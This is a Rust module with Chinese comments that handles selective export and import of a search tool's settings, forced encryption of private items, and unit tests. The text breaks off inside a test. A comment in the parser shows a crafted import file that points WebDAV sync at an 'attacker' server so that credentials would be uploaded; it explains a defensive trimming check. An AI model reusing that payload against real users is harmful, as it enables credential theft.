/*! r54 需求 3：**明文**配置的按项导出 / 导入。

# 这一轮要的东西（用户原话）

> 「三、数据导入导出：新增导入导出功能。导出时提供数据项勾选界面，可选项包括
> API Key、引擎配置、应用设置等，默认仅勾选非隐私内容；导出的配置数据不加密，
> 可直接被他人导入恢复；备份功能单独存在且支持加密；导入功能仅支持直接恢复
> 导出的明文数据，不支持导入加密备份。」

四个要求，逐条落在哪里：

| 要求 | 落点 |
| --- | --- |
| 导出有勾选界面 | 前端 `renderExportBox()`（数据栏那张复选表），选项从 `export_items()` 拿 |
| 可选项含 API Key / 引擎配置 / 应用设置 | `GROUPS` 表，八项 |
| **默认只勾非隐私** | `Group::default_checked` 字段 |
| 导出的不加密、可直接导入 | `export_items` 不做 `crypto::encrypt` |
| 备份另存在、且加密 | 那是 `export_config` / `import_config` 那条老路，**这里一行都没动** |
| 导入只吃明文，不吃加密备份 | `import_items` 里 `crypto::looks_encrypted` 挡掉 |

# 为什么明文和备份必须分成两个入口

备份（`.QuickSearch`）是**整份配置 + 可选加密**，恢复时是"全量覆盖式"的
（`apply_view` 把认识的键全灌回去）。明文导出是**挑几项 + 合并式**的 ——
用户只想把"我的搜索引擎勾选"给同事，不想连收藏夹、WebDAV 密码一起给。

把这两件事塞进同一个文件格式会立刻出乱子：同一个 `barList` 键，在备份里是
"整份替换"，在明文导出里是"只换这一项"。格式不分，语义就没法分。所以：

* 备份文件：裸 `config_view()` 形状的 JSON（或加密文本）→ `restore_from_text`
* 明文导出：`{kind:"qs-config", items:[...], data:{...}}` → `import_items`

两者靠 `kind` 一眼分得开，`import_items` **明确拒绝**加密备份（不是"试一下
能不能解"，是"这份文件不是明文导出格式"），免得用户把加密备份拖到明文导入
里收到一句看不懂的报错。

# 导出文件里的 `data` 是什么

就是 `config_view()` 的**子集**（只留勾中组涉及的键）。形状与 config_view
一致是有意的：导入侧直接复用 `apply_view` 那套解析（同样的 clamp、同样的
默认值），两边不会各写一套"这个键怎么读"的规则。
*/

use crate::crypto;
use serde_json::{json, Value};

/// 一组可勾选的导出项。
///
/// `keys` 是 **config_view() 里的键名**（camelCase），不是 Config 字段名 ——
/// 这样导出内容与前端看到的那份配置严格同形，导入侧也能直接喂给 `apply_view`。
pub struct Group {
    /// 组的 id（勾选界面回传的就是这个）
    pub id: &'static str,
    /// 界面上的标题
    pub name: &'static str,
    /// 一句话说明这项装了什么、给谁用
    pub desc: &'static str,
    /// 这个组涉及 config_view 的哪些键
    pub keys: &'static [&'static str],
    /// **隐私**项。隐私项默认**不勾**，界面标黄。
    ///
    /// 判据（用户口径「默认仅勾选非隐私内容」）：凭据、密码、收藏夹内容、
    /// 备份目标地址 —— 这些给别人会直接造成账号/隐私风险。
    pub private: bool,
    /// 默认要不要勾上
    pub default_checked: bool,
}

/// 八组导出项。
///
/// ⚠ 一张表同时服务三处：设置页的勾选界面、`export_items` 的键裁剪、
///    `import_items` 的合法性校验。**加一组只改这里**，界面和后端自动跟上
///    （与 `imgsearch::ENGINES` / `ocr_engines::ENGINES` 同一个套路）。
pub static GROUPS: &[Group] = &[
    Group {
        id: "apiKeys",
        name: "API Key / 凭据",
        desc: "各识别引擎的 Key、Secret、模型名。给了别人 = 把你的额度给了别人",
        keys: &["ocrKey", "ocrSecret", "ocrCreds"],
        private: true,
        default_checked: false,
    },
    /* v1.5.9：个人访问令牌单列一组。
     *
     * 以前它**不在任何组里** —— 于是勾选界面上根本看不见它，`allow_keys`
     * 也会把它裁掉，"把令牌一起带走"这条路等于不存在。用户 2026-10-24
     * 要求「确保个人密钥也能被纳入同步和备份范围」，这里补上。
     *
     * ⚠ 它和 apiKeys 不是一回事：OCR Key 泄露 = 烧别人的识别额度；
     *   GitHub 令牌泄露 = 别人能以**你的身份**读你的私有仓库、改你的东西。
     *   所以含它的导出**不允许明文落盘**（见 `contains_secret` / `write_plain`）。 */
    Group {
        id: "secrets",
        name: "个人访问令牌",
        desc: "GitHub 个人访问令牌（PAT）。拿到它的人能以你的身份访问仓库，比 API Key 更危险",
        keys: &["githubToken"],
        private: true,
        default_checked: false,
    },
    Group {
        id: "engineConfig",
        name: "引擎配置",
        desc: "横条摆哪些引擎、顺序、分隔线、自定义引擎、搜索地址覆盖、AI 提问后缀",
        keys: &[
            "barList",
            "sepStyle",
            "lastEngine",
            "customEngines",
            "urlOverrides",
            "aiSuffix",
            "aiSuffixes",
            "aiCopyPrompt",
        ],
        private: false,
        default_checked: true,
    },
    Group {
        id: "appSettings",
        name: "应用设置",
        desc: "外观（图标大小、透明度、圆角、主题、玻璃、磨砂）与行为（触发方式、延时、生效范围）",
        keys: &[
            "triggerSelect",
            "triggerCopy",
            "anchorAtMouse",
            "autoStart",
            "autoElevate",
            "iconSize",
            "alpha",
            "barDimAlpha",
            "barGlass",
            "barGlassRefraction",
            "barGlassBevel",
            "barGlassFrost",
            "barGlassAberration",
            "barGlassSpec",
            "barGlassTint",
            "barGlassLive",
            "iconStyle",
            "unifyIcons",
            "barPadding",
            "itemRadius",
            "theme",
            "animations",
            "shadow",
            "barBlur",
            "delayMs",
            "filterMode",
            "filterList",
        ],
        private: false,
        default_checked: true,
    },
    Group {
        id: "favorites",
        name: "收藏夹",
        desc: "收藏的目录、文字与图片内容、唤起快捷键、面板尺寸",
        keys: &["favorites", "favHotkey", "favPanelSizes"],
        private: true,
        default_checked: false,
    },
    Group {
        id: "shortcuts",
        name: "智能直达",
        desc: "直达入口的链接/路径、名称、备注与自定义图标（钉在横条上的格子也在其中）",
        keys: &["shortcuts"],
        // 不含凭据，但会暴露本机路径 —— 标私密只是让默认不勾，用户仍可主动导出
        private: true,
        default_checked: false,
    },
    Group {
        id: "icons",
        name: "自定义图标",
        desc: "给引擎换过的图标图片（内嵌在文件里，不依赖外部图片路径）",
        keys: &["overrideIcons", "dirIcons"],
        private: false,
        default_checked: true,
    },
    Group {
        id: "hotkeys",
        name: "快捷键",
        desc: "唤起收藏夹的按键（目前只有这一项）",
        keys: &["favHotkey"],
        private: false,
        default_checked: false,
    },
    Group {
        id: "backupSettings",
        name: "备份设置",
        desc: "WebDAV 地址/账号/密码、备份目录。密码给别人 = 把网盘给了别人",
        keys: &[
            "backupPassword",
            "backupDir",
            "webdavUrl",
            "webdavUser",
            "webdavPass",
            "webdavOnStart",
            "webdavOnExit",
        ],
        private: true,
        default_checked: false,
    },
    Group {
        id: "imgsearch",
        name: "识图搜索",
        desc: "识图引擎勾选、默认引擎、公网图片地址",
        keys: &["imgEnable", "imgAddToBar", "imgDefaultEngine", "imgEngines", "imgPublicUrl"],
        private: false,
        default_checked: true,
    },
];

/// 明文导出的文件头标记。
///
/// 导入侧靠它区分「明文导出」和「整份备份（可能是加密的）」。选这个串而不
/// 是 `version` 之类：老备份里也有 `version`，光看那个分不出来。
pub const EXPORT_KIND: &str = "qs-config";

/// 按组 id 找一组（界面回传的 id 直接拿来查）。
pub fn find_group(id: &str) -> Option<&'static Group> {
    GROUPS.iter().find(|g| g.id == id)
}

/// 给前端的勾选表：八组的说明 + 隐私标记 + **默认勾选状态**。
///
/// 界面只负责画，默认值由这里定 —— 与「默认仅勾选非隐私内容」这条要求只有
/// 一个出处，改口径只改 `Group::default_checked`。
pub fn items() -> Value {
    let list: Vec<Value> = GROUPS
        .iter()
        .map(|g| {
            json!({
                "id": g.id,
                "name": g.name,
                "desc": g.desc,
                "private": g.private,
                "checked": g.default_checked,
            })
        })
        .collect();
    json!(list)
}

/// 从整份 config_view 里**只裁**出勾中的那些键。
///
/// * 界面传上来的组 id 一律先过 `find_group`：不认识的 id 直接丢，绝不当成
///   "全都要"（否则一个手写的 / 老版本的界面就能勾出全量导出，绕过"默认
///   只勾非隐私"这条设计）。
/// * 一个键被多组共用时（`favHotkey` 同时属于收藏夹与快捷键）取并集，
///   任一组勾了它就导出。
/// * 勾了但 config_view 里没有的键（老版本配置没这个字段）不会出现 ——
///   导入侧看到"键不在"，按"这一项没有数据"跳过即可，不会报错。
pub fn filter_keys(items: &[String]) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for id in items {
        let Some(g) = find_group(id) else {
            continue;
        };
        for k in g.keys {
            if !out.iter().any(|x| x == k) {
                out.push((*k).to_string());
            }
        }
    }
    out
}

/// 生成明文导出的内容（不含文件头元数据）。
///
/// 返回 `(元数据, data)`：调用方把两者拼成文件内容写出去。
/// 单独返回 data 是为了让导入侧的解析能直接拿它喂 `apply_view`。
pub fn build(view: &Value, items: &[String]) -> (Value, Value) {
    let keys = filter_keys(items);
    let mut data = serde_json::Map::new();
    for k in &keys {
        if let Some(v) = view.get(k) {
            data.insert(k.clone(), v.clone());
        }
    }
    (
        json!({
            "kind": EXPORT_KIND,
            "items": items,
            // 导出时刻（unix 秒）。导入界面显示"这份配置是什么时候导出的"，
            // 方便判断新旧。
            "at": std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs() as i64)
                .unwrap_or(0),
        }),
        Value::Object(data),
    )
}

/// 这份导出里有没有**绝不能用明文写出**的键。
///
/// 判据故意是"数据里真有非空令牌"，而不是"勾了 secrets 组"：
/// 勾了组但本机压根没填令牌时，加密一份空内容只会让接收方多一次输密码。
/// 反过来，只要令牌非空，不管用户勾的是哪一组，都不许明文落盘。
pub fn contains_secret(data: &Value) -> bool {
    data.get("githubToken")
        .and_then(|x| x.as_str())
        .map(|s| !s.trim().is_empty())
        .unwrap_or(false)
}

/// 这份导出**是否必须**加密（用户没得选）。
///
/// 判据：**勾了隐私组、而且那个组真的带了东西出来**。
///
/// 两个条件缺一不可 ——
///
/// * 只看"勾了什么"会把空内容也算成隐私：勾了「个人访问令牌」但本机压根没填，
///   导出的文件里一个敏感字符都没有，还逼用户去设密码，那是无谓的摩擦；
/// * 只看"内容里有没有敏感键"又太窄：`Group::private` 是**声明**，
///   以后给某个隐私组加字段，不应该再回来改这里。
///
/// 外加一道兜底 `contains_secret`：万一某个组被误标成非隐私，令牌仍然
/// 不会明文落盘（它看的是**值**，不是组的标记）。
pub fn needs_encrypt(items: &[String], data: &Value) -> bool {
    if contains_secret(data) {
        return true;
    }
    items.iter().any(|id| {
        let Some(g) = find_group(id) else {
            return false;
        };
        if !g.private {
            return false;
        }
        // 这一组里至少有一个键真的带了非空值
        g.keys.iter().any(|k| match data.get(*k) {
            None | Some(Value::Null) => false,
            Some(Value::String(s)) => !s.trim().is_empty(),
            Some(Value::Array(a)) => !a.is_empty(),
            Some(Value::Object(o)) => !o.is_empty(),
            Some(_) => true,
        })
    })
}

/// 把挑中的组写成一份 `.qsconf`。返回写进去的设置项个数。
///
/// # 什么时候加密
///
/// | 情况 | 结果 |
/// |---|---|
/// | 必须有（[`needs_encrypt`]） | 加密；没密码就**拒绝**，绝不明文 |
/// | 用户勾了「加密导出」 | 加密；没密码就拒绝，并说明"是你自己勾的" |
/// | 都不成立 | 明文（用户 r54 的原话："导出的配置数据不加密，可直接被他人导入恢复"）|
///
/// 拒绝而不是"退回明文"或"用 DPAPI"：前者等于把凭据发出去；后者换机解不开，
/// 等于给用户一个用不了的导出文件。
///
/// 这是 `export_items` 命令真正干活的那一半（命令自己只负责弹对话框）——
/// 拆出来的理由写在 main.rs 那个函数的注释里：纯逻辑才能被单测覆盖，
/// 而"导出 → 落盘 → 再导入"这条链路是真机探针够不到的地方（原生文件对话框
/// 不接受注入的按键）。
pub fn write_plain(
    path: &std::path::Path,
    items: &[String],
    view: &Value,
    password: Option<&str>,
    encrypt: bool,
) -> Result<usize, String> {
    let (meta, data) = build(view, items);
    let n_keys = data.as_object().map(|o| o.len()).unwrap_or(0);
    let forced = needs_encrypt(items, &data);
    let mut file = meta;
    if let Value::Object(o) = &mut file {
        o.insert("data".into(), data);
    }
    let text = serde_json::to_string_pretty(&file)
        .map_err(|e| format!("序列化失败：{e}"))?;
    let out = if forced || encrypt {
        let pw = password.unwrap_or("").trim();
        if pw.is_empty() {
            /* 两种原因分开说：一个是"你没得选"，一个是"你自己勾的"。
             * 混成一句话，用户会以为是软件在拦他。 */
            return Err(if forced {
                "这次导出里有隐私项（API Key / 密码 / 个人访问令牌 / 收藏内容），\
                 不能明文写出 —— 请先在「备份」页设置备份密码，再导出"
                    .into()
            } else {
                "你勾了「加密导出」，但本机还没有备份密码 —— 先去「备份」页设一个".into()
            });
        }
        crypto::encrypt(&text, pw)?
    } else {
        text
    };
    std::fs::write(path, out).map_err(|e| format!("写入失败：{e}"))?;
    Ok(n_keys)
}

/// 读一份导出，返回勾了哪些组 + 数据。三道闸都在 `parse` 里。
///
/// `max_bytes` 与备份那条路一致（32MB）：**读之前**就看大小 —— 拿一个 2GB 的
/// 文件去 `read_to_string` 能把内存吃光，先 `metadata` 一下几乎不要钱。
///
/// `password` 用来解**含个人令牌**的那种导出（v1.5.9）。明文导出用不到它，
/// 传 `None` 即可；遇到加密内容又没给密码时会给出"去备份页填密码"的指引，
/// 而不是让 `parse` 报一句"这是加密备份"（那句话对这份文件是误导：
/// 它确实是一条明文导出，只是带了个信封）。
pub fn read_plain(
    path: &std::path::Path,
    max_bytes: u64,
    password: Option<&str>,
) -> Result<(Vec<String>, Value), String> {
    match std::fs::metadata(path) {
        Ok(m) if m.len() > max_bytes => {
            return Err("文件超过 32MB，确认选对了吗".to_string());
        }
        _ => {}
    }
    let text = std::fs::read_to_string(path)
        .map_err(|e| format!("文件读不出来：{e}"))?;
    let text = if crypto::looks_encrypted(&text) {
        let pw = password.unwrap_or("").trim();
        if pw.is_empty() {
            /* v1.5.10：这句话由前端展示在**密码输入框**上方，不再是
             * "去备份页填密码" —— 用户就是在这里输。 */
            return Err("这份配置是加密的，需要输入密码才能导入".into());
        }
        crypto::unseal(&text, pw)?
    } else {
        text
    };
    parse(&text)
}

/// 读一份**已解开**的导出内容，返回其中**勾过哪些组**与数据。
///
/// 三道闸，全部是"宁可拒绝也别冲掉用户配置"：
///
/// 1. **加密内容直接拒**。v1.5.9 起"含个人令牌的导出"是加密的，但那一步
///    解密在 `read_plain` 里（它知道备份密码），走到这里时应当已经是明文。
///    留这道闸是为了：谁绕过 `read_plain` 直接把密文喂进来，也不会被
///    `serde_json` 解成一份"看起来合法、其实全是默认值"的东西。
/// 2. `kind` 必须是 `qs-config`。整份备份（裸 config_view 形状）没有这个字段，
///    照样拒：全量恢复是备份页的事，明文导入不该悄悄变成全量覆盖。
/// 3. `items` 必须是字符串数组。别的类型（对象 / 数字）说明文件被改过，
///    宁可拒绝也不要猜。
pub fn parse(text: &str) -> Result<(Vec<String>, Value), String> {
    if crypto::looks_encrypted(text) {
        return Err("这份内容还是加密的 —— 请通过正常入口导入（会自动用备份密码解开）".into());
    }
    let v: Value =
        serde_json::from_str(text).map_err(|e| format!("文件内容不是有效的 JSON：{e}"))?;
    let Some(kind) = v.get("kind").and_then(|x| x.as_str()) else {
        return Err("这份文件不是明文导出的配置（缺少 kind 字段）—— 若它是备份文件，请去「备份」页".into());
    };
    if kind != EXPORT_KIND {
        return Err(format!("不支持的文件类型：{kind}"));
    }
    let items = match v.get("items") {
        Some(Value::Array(a)) => a
            .iter()
            .filter_map(|x| x.as_str().map(|s| s.to_string()))
            .collect::<Vec<_>>(),
        _ => return Err("导出文件的 items 字段不对（应当是字符串数组）".into()),
    };
    let Some(data) = v.get("data").and_then(|x| x.as_object()) else {
        return Err("导出文件的 data 字段缺失".into());
    };
    if data.is_empty() {
        return Err("这份导出里没有任何数据（导出时大概什么都没勾）".into());
    }
    // 只保留认得的组 —— 别的组对 apply_view 没意义，留着只是噪声
    let known: Vec<String> = items.into_iter().filter(|i| find_group(i).is_some()).collect();
    /* ⚠ 必须**按勾选的组裁剪 data**，不能原样把整份 data 交给 apply_view。
     *
     * apply_view 认得 webdavUrl / webdavUser / webdavPass / webdavOnStart /
     * webdavOnExit —— 一份 `{"kind":"qs-config","items":["appSettings"],
     * "data":{"webdavUrl":"https://attacker/dav/","webdavPass":"x",
     * "webdavOnStart":true}}` 就能在用户只勾了"应用设置"的情况下，把同步目标
     * 换成别人的服务器，下次启动/退出时把**含 OCR Key 和备份密码的整份配置**
     * 推上去。用户看到的只是一次正常的明文导入。
     *
     * 裁剪口径和 `export_items` 完全对称：只取勾中组声明过的键。
     * 唯一的例外是 `dirIcons` —— 它跟着 `overrideIcons` 一起导出的图片，
     * 导入侧目前没有落盘实现（见 apply_view），所以这里**不**为它放行。 */
    let allow = allow_keys(&known);
    let mut kept = serde_json::Map::new();
    for (k, v) in data {
        if allow.contains(k.as_str()) {
            kept.insert(k.clone(), v.clone());
        }
    }
    if kept.is_empty() {
        return Err("勾选的这些组里没有任何可导入的字段（文件可能被改过）".into());
    }
    Ok((known, Value::Object(kept)))
}

/// 勾中的那些组一共允许哪些键（与 [`export_items`] 的裁剪口径对称）。
fn allow_keys(items: &[String]) -> std::collections::HashSet<&'static str> {
    let mut out = std::collections::HashSet::new();
    for id in items {
        if let Some(g) = find_group(id) {
            for k in g.keys {
                // dirIcons 只导出不导入（导入侧没有图标落盘实现），别放它过去
                if *k == "dirIcons" {
                    continue;
                }
                out.insert(*k);
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_view() -> Value {
        json!({
            "barList": ["@ocr", "baidu"],
            "theme": "dark",
            "ocrKey": "SECRETKEY",
            "favorites": [{"id": "g1", "title": "日常", "items": []}],
        })
    }

    /// 把导出元数据与数据拼成完整的文件内容（测试里用，跟后端写盘同一形状）
    fn merge(meta: Value, data: Value) -> Value {
        let mut m = meta;
        if let Value::Object(o) = &mut m {
            o.insert("data".into(), data);
        }
        m
    }

    #[test]
    fn 默认只勾非隐私() {
        // 用户口径：「默认仅勾选非隐私内容」
        let default_on: Vec<&str> = GROUPS.iter().filter(|g| g.default_checked).map(|g| g.id).collect();
        for id in ["apiKeys", "favorites", "backupSettings"] {
            assert!(!default_on.contains(&id), "隐私项 {id} 不该默认勾选");
        }
        for id in ["engineConfig", "appSettings", "icons", "imgsearch"] {
            assert!(default_on.contains(&id), "常用项 {id} 应当默认勾选");
        }
    }

    #[test]
    fn 勾中的键才导出() {
        let (_, data) = build(&sample_view(), &["engineConfig".to_string()]);
        assert!(data.get("barList").is_some());
        assert!(data.get("theme").is_none(), "应用设置没勾，不该带上");
        assert!(data.get("ocrKey").is_none(), "凭据没勾，绝不能带上");
    }

    #[test]
    fn 认不出的组被忽略() {
        // 手写一个假组 id 进来，不能变成"全量导出"
        let (_, data) = build(
            &sample_view(),
            &["engineConfig".to_string(), "__all__".to_string(), "".to_string()],
        );
        assert!(data.get("barList").is_some());
        assert!(data.get("ocrKey").is_none());
        assert!(data.get("favorites").is_none());
    }

    #[test]
    fn 共用键取并集() {
        // favHotkey 同时属于「收藏夹」与「快捷键」：任一组勾了就导出
        let v = json!({"favHotkey": "Ctrl+Alt+F"});
        let (_, a) = build(&v, &["favorites".to_string()]);
        assert!(a.get("favHotkey").is_some());
        let (_, b) = build(&v, &["hotkeys".to_string()]);
        assert!(b.get("favHotkey").is_some());
    }

    #[test]
    fn 密文不许直接喂进parse() {
        // 解密是 read_plain 的活（它知道备份密码）。谁绕过它把密文直接塞进来，
        // 这里必须顶住 —— 否则 serde 会把信封解成一份"键全丢"的空导出。
        let enc = crypto::encrypt(r#"{"kind":"qs-config"}"#, "pw").unwrap();
        let e = parse(&enc).unwrap_err();
        assert!(e.contains("还是加密的"), "报错要说清内容仍是密文：{e}");
    }

    #[test]
    fn 整份备份也被拒绝() {
        // 裸 config_view 形状（没有 kind）—— 全量恢复是备份页的事
        let e = parse(&serde_json::to_string(&sample_view()).unwrap()).unwrap_err();
        assert!(e.contains("不是明文导出"), "报错要说清不是明文导出：{e}");
    }

    #[test]
    fn 走一圈导出再导入() {
        let (meta, data) = build(&sample_view(), &["engineConfig".to_string()]);
        let file = merge(meta, data);
        let text = serde_json::to_string(&file).unwrap();
        let (items, got) = parse(&text).unwrap();
        assert_eq!(items, vec!["engineConfig".to_string()]);
        assert_eq!(got.get("barList").unwrap(), &json!(["@ocr", "baidu"]));
    }

    #[test]
    fn 空导出被拒() {
        // 什么都没勾 → data 空 → 拒绝。放行的话用户会以为导入成功了
        let (meta, data) = build(&sample_view(), &[]);
        let e = parse(&serde_json::to_string(&merge(meta, data)).unwrap()).unwrap_err();
        assert!(e.contains("没有任何数据"), "报错要说明是空的：{e}");
    }

    #[test]
    fn 组id唯一() {
        for (i, a) in GROUPS.iter().enumerate() {
            for b in GROUPS.iter().skip(i + 1) {
                assert_ne!(a.id, b.id, "组 id 重复：{}", a.id);
            }
            assert!(!a.keys.is_empty(), "组 {} 没有任何键", a.id);
            assert!(!a.name.is_empty());
        }
    }

    /* ---- 真磁盘往返：write_plain → read_plain ----
     *
     * 这一组补的是 `export_items` / `import_items` 两条命令**真正干活的那一半**
     * （命令自己是弹对话框的薄壳，见 main.rs 那两个函数的注释）。为什么值得
     * 单独写：真机探针够不到原生文件对话框（文件名框拿不到键盘焦点，注入的
     * 按键全被吃掉，白跑三轮），而"导出的文件能再导回来"是用户原话里的硬
     * 要求 —— 这条路不走磁盘单测就没人证。 */

    /// 落一个临时文件路径（不创建文件）。测试之间撞名会让断言互相污染，
    /// 所以每个用例一条独立路径（测试名 + 纳秒时间戳）。
    fn tmp_file(name: &str) -> std::path::PathBuf {
        let n = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        std::env::temp_dir().join(format!("qs-export-test-{name}-{n}.qsconf"))
    }

    #[test]
    fn 落盘再读回来键不丢() {
        let p = tmp_file("roundtrip");
        let view = sample_view();
        let n = write_plain(&p, &["engineConfig".to_string()], &view, None, false).unwrap();
        assert!(n > 0, "至少写进去一个键");
        // 文件必须是**明文**：人 / JSON 解析器都读得出来（用户原话：不加密）
        let text = std::fs::read_to_string(&p).unwrap();
        let j: Value = serde_json::from_str(&text).expect("导出的必须是明文 JSON");
        assert_eq!(j["kind"], json!(EXPORT_KIND));
        assert_eq!(j["items"], json!(["engineConfig"]));

        let (items, data) = read_plain(&p, 32 * 1024 * 1024, None).unwrap();
        assert_eq!(items, vec!["engineConfig".to_string()]);
        assert_eq!(data.get("barList").unwrap(), &json!(["@ocr", "baidu"]));
        assert!(data.get("ocrKey").is_none(), "凭据没勾，文件里不该有");
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 落盘的文件不是密文() {
        // 备份那条路设了密码就是 AES-GCM 密文；明文这条路**一个字都不碰加密**
        let p = tmp_file("plain");
        write_plain(&p, &["appSettings".to_string()], &sample_view(), None, false).unwrap();
        let raw = std::fs::read(&p).unwrap();
        assert!(!crypto::looks_encrypted(
            &String::from_utf8_lossy(&raw)
        ), "明文导出一眼就能被 looks_encrypted 当成密文，说明格式走错了");
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 整份加密备份走不了明文导入() {
        // 拿一份**真的**加密备份文件去 read_plain：两种情形都要被挡住，
        // 而且给出的理由要是"该怎么做"，不是一句"解密失败"。
        let p = tmp_file("encrypted");
        let text = crypto::encrypt(&serde_json::to_string(&sample_view()).unwrap(), "pw").unwrap();
        std::fs::write(&p, text).unwrap();

        // ① 没密码：让用户在密码框里输（v1.5.10 起导入有了自己的密码环节，
        //    不再叫用户去「备份」页改密码 —— 那会连累其他备份）
        let e = read_plain(&p, 32 * 1024 * 1024, None).unwrap_err();
        assert!(e.contains("输入密码"), "报错要说清需要输密码：{e}");

        // ② 给了密码、也解得开，但它是**整份配置**不是明文导出 → 仍要拒，
        //    否则用户一次误点就把整机配置全量覆盖了（那是备份页的动作）
        let e2 = read_plain(&p, 32 * 1024 * 1024, Some("pw")).unwrap_err();
        assert!(e2.contains("不是明文导出"), "报错要说明这不是明文导出：{e2}");
        let _ = std::fs::remove_file(&p);
    }

    /* ---- v1.5.9：个人访问令牌的导出边界 ----
     *
     * 用户要求「确保个人密钥也能被纳入同步和备份范围」。纳入 ≠ 明文外发：
     * 令牌能给的东西（以你的身份读私有仓库）比 OCR Key 危险得多，所以
     * 含令牌的导出必须加密，没密码宁可拒绝。这一组就是钉住这条边界。 */

    fn view_with_token() -> Value {
        json!({
            "barList": ["@ocr"],
            "githubToken": "ghp_realtoken_123",
        })
    }

    #[test]
    fn 令牌能被子集导出带走() {
        // 以前 githubToken 不在任何组里 → 勾了也导不出来
        let (_, data) = build(&view_with_token(), &["secrets".to_string()]);
        assert_eq!(data.get("githubToken").unwrap(), &json!("ghp_realtoken_123"));
        assert!(data.get("barList").is_none(), "别的组没勾，不该带上");
    }

    #[test]
    fn 别的组勾了也带不走令牌() {
        // 防"顺手导出"：只勾引擎配置时，令牌绝不能跟着走
        let (_, data) = build(&view_with_token(), &["engineConfig".to_string()]);
        assert!(data.get("githubToken").is_none(), "令牌只属于 secrets 组");
        assert!(data.get("barList").is_some());
    }

    #[test]
    fn 含令牌的导出没有密码就拒绝落盘() {
        let p = tmp_file("secret-nopw");
        let e = write_plain(&p, &["secrets".to_string()], &view_with_token(), None, false).unwrap_err();
        // 文案现在统一说"隐私项"（用户 2026-10-25：隐私项一律强制加密），
        // 令牌只是隐私项里的一种，所以报错用上位概念
        assert!(e.contains("隐私项"), "报错要说明是隐私项：{e}");
        assert!(e.contains("备份密码"), "要告诉用户出路是设备份密码：{e}");
        assert!(!p.exists(), "拒绝的时候不该留下任何文件");
    }

    /* ── v1.5.10：加密勾选框与"隐私项强制加密" ──────────────────────
     *
     * 用户 2026-10-25：「导出按钮旁边应该有一个勾选框，勾选后则导出的数据也会
     * 加密，不勾选则导出的就不加密，但是如果导出的数据包括涉及隐私的，
     * 那么就强制加密。」
     *
     * 三段规则要分别钉住：不勾→明文、勾了→密文、含隐私→不管勾没勾都密文。 */

    fn plain_view() -> Value {
        json!({ "barList": ["@ocr"], "theme": "dark" })
    }

    #[test]
    fn 不勾加密也不含隐私时是明文() {
        let p = tmp_file("opt-plain");
        write_plain(
            &p,
            &["engineConfig".to_string()],
            &plain_view(),
            Some("有密码也不该用"),
            false, // ← 用户没勾
        )
        .unwrap();
        let raw = std::fs::read_to_string(&p).unwrap();
        assert!(
            !crypto::looks_encrypted(&raw),
            "用户没勾加密、内容也不含隐私 → 必须是明文"
        );
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 勾了加密就用密码封起来() {
        let p = tmp_file("opt-enc");
        write_plain(
            &p,
            &["engineConfig".to_string()],
            &plain_view(),
            Some("自选口令"),
            true, // ← 用户勾了
        )
        .unwrap();
        let raw = std::fs::read_to_string(&p).unwrap();
        assert!(crypto::looks_encrypted(&raw), "勾了加密就必须是密文");
        // 而且解出来内容完整（注意只能断言 engineConfig 组声明过的键 ——
        // parse 会按勾选的组裁剪，theme 属于 appSettings，不会跟着来）
        let (items, data) = read_plain(&p, 32 * 1024 * 1024, Some("自选口令")).unwrap();
        assert_eq!(items, vec!["engineConfig".to_string()]);
        assert_eq!(data.get("barList").unwrap(), &json!(["@ocr"]));
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 勾了加密但没设密码要说是自己勾的() {
        let p = tmp_file("opt-no-pw");
        let e = write_plain(&p, &["engineConfig".to_string()], &plain_view(), None, true)
            .unwrap_err();
        assert!(e.contains("加密导出"), "要指明是勾选框导致的：{e}");
        assert!(!p.exists());
    }

    #[test]
    fn 含隐私项时不管勾没勾都强制加密() {
        // 三个隐私组各测一遍：API Key / 收藏夹 / 备份设置
        for (id, view) in [
            ("apiKeys", json!({"ocrKey": "AKID-secret"})),
            ("favorites", json!({"favorites": [{"id": "g", "title": "x", "items": []}]})),
            ("backupSettings", json!({"webdavPass": "app-pw"})),
        ] {
            assert!(
                needs_encrypt(&[id.to_string()], &view),
                "{id} 带内容时应当强制加密"
            );
            // 没给密码 → 必须拒绝，绝不能悄悄写成明文
            let p = tmp_file("force");
            let e = write_plain(&p, &[id.to_string()], &view, None, false).unwrap_err();
            assert!(e.contains("隐私项"), "{id} 的报错要说明隐私项：{e}");
            assert!(!p.exists(), "{id}：拒绝时不该留下文件");
            // 给了密码 → 真的封起来
            write_plain(&p, &[id.to_string()], &view, Some("pw"), false).unwrap();
            let raw = std::fs::read_to_string(&p).unwrap();
            assert!(crypto::looks_encrypted(&raw), "{id}：含隐私必须是密文");
            let _ = std::fs::remove_file(&p);
        }
    }

    #[test]
    fn 隐私组是空的就不强制加密() {
        // 勾了隐私组但一个字都没填：导出的文件里没有任何敏感内容，
        // 再逼用户去设密码只是摩擦。
        let v = json!({ "ocrKey": "", "ocrSecret": "", "githubToken": "   " });
        assert!(!needs_encrypt(&["apiKeys".to_string(), "secrets".to_string()], &v));
        // 但真填了就不行
        let v2 = json!({ "ocrKey": "AKID", "githubToken": "" });
        assert!(needs_encrypt(&["apiKeys".to_string()], &v2));
    }

    #[test]
    fn 非隐私项永远不触发强制加密() {
        for id in ["engineConfig", "appSettings", "icons", "imgsearch"] {
            assert!(
                !needs_encrypt(&[id.to_string()], &sample_view()),
                "{id} 不是隐私组，不该强制加密"
            );
        }
    }

    #[test]
    fn 含令牌的导出加了密也能原样读回来() {
        let p = tmp_file("secret-pw");
        write_plain(
            &p,
            &["secrets".to_string(), "engineConfig".to_string()],
            &view_with_token(),
            Some("跨机口令"),
            false,
        )
        .unwrap();
        // 落盘的必须是信封，不能一眼看到令牌
        let raw = std::fs::read_to_string(&p).unwrap();
        assert!(crypto::looks_encrypted(&raw), "含令牌的导出必须是密文");
        assert!(!raw.contains("ghp_realtoken_123"), "明文里不许出现令牌");

        let (items, data) = read_plain(&p, 32 * 1024 * 1024, Some("跨机口令")).unwrap();
        assert_eq!(items, vec!["secrets".to_string(), "engineConfig".to_string()]);
        assert_eq!(data.get("githubToken").unwrap(), &json!("ghp_realtoken_123"));
